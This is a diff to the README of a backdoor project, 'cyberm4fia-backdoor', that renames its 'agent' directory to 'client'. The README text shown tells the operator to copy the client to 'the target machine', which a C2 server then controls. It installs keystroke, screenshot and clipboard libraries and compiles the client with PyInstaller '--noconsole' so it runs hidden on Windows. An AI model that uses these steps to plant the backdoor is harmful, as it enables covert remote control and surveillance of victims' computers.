@@ -55,8 +55,8 @@
 
 ```
 cyberm4fia-backdoor/
-├── agent/                          # Target agent (backdoor)
-│   ├── agent.py                    # Entry point
+├── client/                          # Target agent (backdoor)
+│   ├── client.py                    # Entry point
 │   ├── config.json                 # C2 server IP, port, reconnect interval
 │   ├── core/
 │   │   ├── protocol.py             # reliable_send / reliable_recv (JSON + \n)
@@ -120,25 +120,25 @@ docker compose up -d
 
 ### Agent (target machine)
 
-Copy the `agent/` directory to the target machine.
+Copy the `client/` directory to the target machine.
 
 ```bash
 pip install pynput Pillow pyautogui pyscreeze pyperclip
-python3 agent/agent.py
+python3 client/client.py
 ```
 
 On Windows, compile to a single executable with PyInstaller:
 
 ```bash
 pip install pyinstaller
-pyinstaller --onefile --noconsole agent/agent.py
+pyinstaller --onefile --noconsole client/client.py
 ```
 
 ---
 
 ## Configuration
 
-### `agent/config.json`
+### `client/config.json`
 
 | Key | Default | Description |
 | --- | --- | --- |
